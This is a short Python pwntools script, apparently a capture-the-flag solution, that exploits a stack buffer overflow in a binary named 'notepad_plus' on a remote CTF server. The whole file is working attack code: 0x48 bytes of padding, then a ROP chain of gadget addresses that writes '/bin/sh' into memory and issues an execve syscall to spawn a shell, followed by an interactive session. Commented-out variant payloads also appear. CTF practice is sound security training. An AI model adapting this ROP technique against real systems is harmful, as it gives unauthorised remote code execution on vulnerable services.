#!/usr/bin/env python

from pwn import *

pop_rdi_ret = 0x0000000000400686
pop_rsi_r15 = 0x0000000000400684
pop_rax_rdx_rbx = 0x0000000000481d16
# pop_rdx_ret = 0x000000000044cd25
mov_rdi_rsi = 0x000000000044a48b
pop_rax_ret = 0x000000000044cccc
syscall = 0x000000000040142c

pop_rdx_rsi = 0x000000000044f2a9
rdi_rbp_ret = 0x000000000040283c
pop_rsi_ret = 0x00000000004124d3

# r = process( './notepad_plus' )
r = remote( 'ctf.adl.tw', 11004 )

# pause()

payload = 'A'*0x48 + p64( pop_rdi_ret ) + p64( 0x6b6000 ) + p64( pop_rsi_r15 ) + '/bin/sh\x00' + p64(0) + p64( mov_rdi_rsi ) + p64( pop_rax_rdx_rbx ) + p64(0x3b) + p64(0) + p64(0) + p64( pop_rsi_ret ) + p64(0) + p64( syscall )
# payload = 'A'*0x48 + p64( push_rsp ) + "/bin/sh\x00" + p64( mov_rdi_rsi ) + p64( pop_rdx_rsi ) + p64(0) + p64(0) + p64( pop_rax_rdx_rbx ) + p64(0x3b) + p64(0) + p64(0) + p64(syscall)
# payload = 'A'*0x48 + p64( 0xdeadbeef ) + 'B'*0x40
r.sendlineafter( 'Write some note:', payload )

r.interactive()
